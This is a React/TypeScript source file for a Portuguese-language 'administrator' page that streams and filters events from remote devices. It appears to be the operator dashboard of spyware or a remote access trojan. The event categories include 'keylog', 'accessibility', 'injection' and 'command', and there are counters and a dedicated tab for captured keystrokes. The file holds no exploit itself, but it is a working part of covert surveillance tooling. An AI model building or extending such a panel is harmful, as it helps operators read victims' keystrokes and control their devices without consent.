import { useState, useEffect, useRef } from "react";
import { Layout, TopBar, Panel, PanelHeader } from "@/components/layout";
import { useSocket } from "@/hooks/use-socket";

const G = "#00ff88";

interface LogEntry {
  id: number;
  deviceName: string;
  type: string;
  message: string;
  createdAt: string;
}

function typeColor(type: string) {
  switch (type) {
    case "activity": return G;
    case "keylog": return G;
    case "accessibility": return "#44aaff";
    case "connection": return "#ffaa00";
    case "injection": return "#ff44aa";
    case "command": return "#aa88ff";
    default: return "#556";
  }
}

export default function Administrador() {
  const socket = useSocket();
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [keylogFilter, setKeylogFilter] = useState("");
  const [activeTab, setActiveTab] = useState<"keylogger" | "accessibility" | "activity" | "all">("all");
  const bottomRef = useRef<HTMLDivElement>(null);
  const counter = useRef(0);

  useEffect(() => {
    fetch("/api/events?limit=100", { credentials: "include" })
      .then((r) => r.json())
      .then((data: any[]) => {
        setLogs(data.map((e, i) => ({ ...e, id: i })));
      })
      .catch(() => {});
  }, []);

  useEffect(() => {
    const handle = (data: any) => {
      counter.current += 1;
      setLogs((prev) => [
        {
          id: counter.current,
          deviceName: data.deviceName || "APP",
          type: data.type || "activity",
          message: data.message,
          createdAt: data.createdAt || new Date().toISOString(),
        },
        ...prev.slice(0, 499),
      ]);
    };
    socket.on("event:new", handle);
    return () => {
      socket.off("event:new", handle);
    };
  }, [socket]);

  const filtered = logs.filter((l) => {
    const matchTab =
      activeTab === "all" ||
      (activeTab === "keylogger" && l.type === "keylog") ||
      (activeTab === "accessibility" && l.type === "accessibility") ||
      (activeTab === "activity" && l.type === "activity");
    const matchSearch = keylogFilter === "" || l.message.toLowerCase().includes(keylogFilter.toLowerCase());
    return matchTab && matchSearch;
  });

  const activityCount = logs.filter((l) => l.type === "activity").length;
  const keylogCount = logs.filter((l) => l.type === "keylog").length;
  const accCount = logs.filter((l) => l.type === "accessibility").length;

  return (
    <Layout>
      <TopBar title="ADMINISTRADOR // LOGS DE MONITORAMENTO">
        <span style={{ color: G }}>{activityCount} ATIV.</span>
        <span style={{ color: G }}>{keylogCount} KEYLOGS</span>
        <span style={{ color: "#44aaff" }}>{accCount} ACC</span>
      </TopBar>

      <div style={{ display: "grid", gridTemplateColumns: "repeat(4, 1fr)", gap: 8, marginBottom: 12 }}>
        {[
          { label: "TOTAL LOGS", value: logs.length, color: G },
          { label: "ATIVIDADE", value: activityCount, color: G },
          { label: "ACESSIBILIDADE", value: accCount, color: "#44aaff" },
          { label: "COMANDOS", value: logs.filter((l) => l.type === "command").length, color: "#aa88ff" },
        ].map((s) => (
          <Panel key={s.label} style={{ padding: "8px 12px" }}>
            <div style={{ fontSize: 8, color: "#445", letterSpacing: "0.1em", marginBottom: 4 }}>{s.label}</div>
            <div style={{ fontSize: 20, fontWeight: "bold", color: s.color }}>{s.value}</div>
          </Panel>
        ))}
      </div>

      <div style={{ display: "flex", gap: 8, marginBottom: 10, alignItems: "center" }}>
        {(["all", "activity", "keylogger", "accessibility"] as const).map((tab) => (
          <button
            key={tab}
            onClick={() => setActiveTab(tab)}
            style={{
              background: activeTab === tab ? G : "transparent",
              color: activeTab === tab ? "#000" : "#445",
              border: `1px solid ${activeTab === tab ? G : "#223"}`,
              fontSize: 9,
              padding: "3px 10px",
              cursor: "pointer",
              fontFamily: "inherit",
              fontWeight: "bold",
              letterSpacing: "0.1em",
            }}
          >
            {tab === "all" ? "TODOS" : tab.toUpperCase()}
          </button>
        ))}
        <input
          value={keylogFilter}
          onChange={(e) => setKeylogFilter(e.target.value)}
          placeholder="[ FILTRAR LOGS... ]"
          style={{
            flex: 1,
            background: "#050f07",
            border: `1px solid #1a3a20`,
            color: G,
            fontSize: 10,
            padding: "3px 8px",
            fontFamily: "inherit",
            outline: "none",
          }}
        />
        <button
          onClick={() => setLogs([])}
          style={{
            background: "transparent",
            border: "1px solid #332",
            color: "#ff4444",
            fontSize: 9,
            padding: "3px 8px",
            cursor: "pointer",
            fontFamily: "inherit",
            letterSpacing: "0.08em",
          }}
        >
          [ LIMPAR ]
        </button>
      </div>

      <Panel style={{ height: "calc(100vh - 300px)", display: "flex", flexDirection: "column" }}>
        <PanelHeader>
          <span>&gt; LOG STREAM [{filtered.length}]</span>
          <span style={{ color: "#445" }}>TEMPO REAL</span>
        </PanelHeader>
        <div style={{ flex: 1, overflowY: "auto", padding: 0 }}>
          {filtered.length === 0 ? (
            <div style={{ padding: 20, color: "#334", fontSize: 10, textAlign: "center" }}>
              &gt; AGUARDANDO EVENTOS...
            </div>
          ) : (
            filtered.map((entry) => (
              <div
                key={entry.id}
                style={{
                  display: "grid",
                  gridTemplateColumns: "130px 80px 80px 1fr",
                  gap: 8,
                  padding: "3px 10px",
                  borderBottom: "1px solid #0a160c",
                  fontSize: 10,
                  alignItems: "center",
                  fontFamily: "inherit",
                }}
              >
                <span style={{ color: "#445", fontSize: 8 }}>
                  {new Date(entry.createdAt).toLocaleTimeString("pt-BR")}
                </span>
                <span style={{ color: "#667", fontSize: 9, whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
                  {entry.deviceName}
                </span>
                <span
                  style={{
                    fontSize: 8,
                    color: typeColor(entry.type),
                    border: `1px solid ${typeColor(entry.type)}44`,
                    padding: "0 4px",
                    borderRadius: 2,
                    textAlign: "center",
                    letterSpacing: "0.06em",
                  }}
                >
                  {entry.type.toUpperCase()}
                </span>
                <span style={{ color: entry.type === "keylog" ? G : "#778", fontSize: 10, wordBreak: "break-all" }}>
                  {entry.message}
                </span>
              </div>
            ))
          )}
          <div ref={bottomRef} />
        </div>
      </Panel>
    </Layout>
  );
}
